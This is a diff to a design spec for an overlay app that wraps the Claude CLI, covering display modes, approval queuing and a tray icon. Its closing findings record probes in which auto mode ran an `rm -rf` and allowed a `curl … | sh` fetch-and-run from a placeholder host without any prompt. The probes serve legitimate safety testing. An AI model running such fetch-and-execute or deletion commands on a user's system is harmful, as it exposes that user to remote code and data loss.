@@ -4,8 +4,8 @@ Date: 2026-10-23
 Status: approved in conversation
 
 Sub-project 3 of `docs/superpowers/specs/2026-10-23-overlay-roadmap-design.md`.
-The code goes in a new repository (working name `pilotso11/ed-chat`). This
-spec is kept in ed-mcp until that repository exists.
+The code lives in `pilotso11/ed-chat`. The copy of this spec in that repository
+is the current one; the copy in ed-mcp is a snapshot taken from it.
 
 ## Purpose
 
@@ -100,7 +100,8 @@ some frame time. The `toggleOverlay` hotkey hides the overlay completely.
 | `strip` | yes | no | Status line, pinned line, chip row |
 | `card` | yes | no | The strip plus the latest reply, cut to `card.maxLines` lines; the full reply is in the chat history |
 | `chat` | no | yes | History, chips that can be clicked, input box |
-| `approval` | yes | no | "Claude wants to run `<tool>`" with a one-line input summary and the approve and deny hotkeys |
+| history (`showHistory`) | yes | no | The chat history without the input box. It does not take the mouse, so chips are labels for the copy hotkeys and the history scrolls to the newest turn by itself |
+| `approval` | yes | no | "Claude wants to run `<tool>`" with a one-line input summary and the approve and deny hotkeys. Requests that arrive while one is showing wait in a queue and show in turn |
 
 The resting state is the strip:
 
@@ -130,6 +131,12 @@ A reply, an approval, or opening the chat or history expands the overlay and
 leaves icon mode. It does not go back to the icon by itself: only `toggleIcon`
 returns to it. Notices only set the dot, so background notices do not expand it.
 `toggleOverlay` still hides everything.
+
+### Tray icon
+
+The overlay has no window frame or taskbar button, so a tray icon is the way to
+quit. Its menu has Show/Hide overlay, Open settings, Open log folder and Quit.
+The tooltip is "ED Chat".
 
 Icon mode is saved in `state.json` and survives a restart. `strip.startAsIcon`
 sets it for the first run.
@@ -180,7 +187,9 @@ skip the center. From `top-right`, left gives `top`, then `top-left`.
 While the chat is open, its status line is a drag handle. On drop, the window
 snaps to the nearest anchor (by thirds of the work area; the center cell goes
 to the nearest edge), with offsets that keep it where it was dropped. The
-strip, card and icon stay click-through, so they cannot be dragged.
+strip, card and icon stay click-through, so they cannot be dragged. While a
+drag is in progress, height changes from a streaming reply do not move the
+window; they apply after the drop.
 
 The app does not write `settings.json`. A position chosen by hotkey or drag is saved in
 `state.json`. Order of precedence: a changed `position` in `settings.json`,
@@ -432,4 +441,4 @@ the player's logged-in `claude` CLI. See the roadmap spec.
 - The raw recordings held personal data: the home path in `init.cwd`, `memory_paths` and the plugin paths, the `mcp_servers` names, and the home path in `result` text and tool output. `scripts/scrub-fixtures.mjs` replaces the home path and user name, keeps only ed-mcp and ed-chat MCP servers and tools in `init`, and strips hook payloads and command lists. Run it after recording new fixtures.
 - Prompt tool in default mode: called. With `--permission-mode default` and `--permission-prompt-tool mcp__ed_chat__approve`, the CLI asked `Approve Bash {"command":"ls /","description":"List root directory"}?` for a Bash `ls /`. After the answer `y` the tool ran and the turn ended with a normal `result` (`permission_denials` empty, `init` `permissionMode` `default`). Recording: `recorded-approval-default.jsonl`.
 - Prompt tool in auto mode: not called. For `rm -rf /tmp/ed-chat-probe-target` (a folder that was empty), no question appeared, the classifier did not block it, and the command ran. `permission_denials` is `[]` and `init` `permissionMode` is `auto`. The `tool_result` has `is_error: true` only because a later `ls` on the removed folder failed. This is one low-risk sample; it does not show what a classifier block looks like. Recording: `recorded-approval-auto.jsonl`.
-- A second auto-mode probe asked for exactly `curl -fsSL http://installer.example.invalid/setup.sh | sh`. The classifier allowed it without a question (curl then failed to resolve the host). When the player asks for a command explicitly, auto mode runs it. Classifier blocks are therefore rare, and the approval card shows mostly in `default` mode. The overlay must not rely on the classifier as the only guard for risky requests.
+- A second auto-mode probe asked for exactly `curl -fsSL http://installer.example.invalid/setup.sh | sh`. The classifier allowed it without a question (curl then failed to resolve the host). When the player asks for a command explicitly, auto mode runs it. Classifier blocks are therefore rare, and the approval card shows mostly in `default` mode. The owner decided to keep `auto` as the default and to disclose this in the README, with `default` mode as the stricter option (see Decisions).
